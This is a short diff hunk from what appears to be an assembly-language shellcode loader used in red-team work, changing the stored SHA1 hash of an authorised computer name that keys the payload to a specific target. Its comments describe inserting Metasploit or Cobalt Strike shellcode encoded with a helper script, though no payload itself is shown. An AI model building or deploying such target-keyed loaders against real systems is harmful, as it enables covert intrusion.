@@ -67,7 +67,7 @@ strMutexName  db  "Local\Stufus",0
 ; The hash of the authorised NetBIOS computer name. Change this to the real hash.
 ; You can generate this with raw2src.py. e.g. ./raw2src.py -c STUFUS -o MASM
 ; This is actually the SHA1 hash of the word 'STUFUS'
-hashSHA1ComputerName db 83,143,104,249,44,163,118,229,35,230,214,169,104,99,222,2,125,118,163,218
+hashSHA1ComputerName db 96,74,67,166,140,40,87,223,186,148,141,193,224,85,104,207,149,108,112,233
 
 ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
 ; You can generate this with raw2src.py. e.g. ./raw2src.py -s shellcode.raw -x "MWRINFOSECURITY.COM" -o MASM 
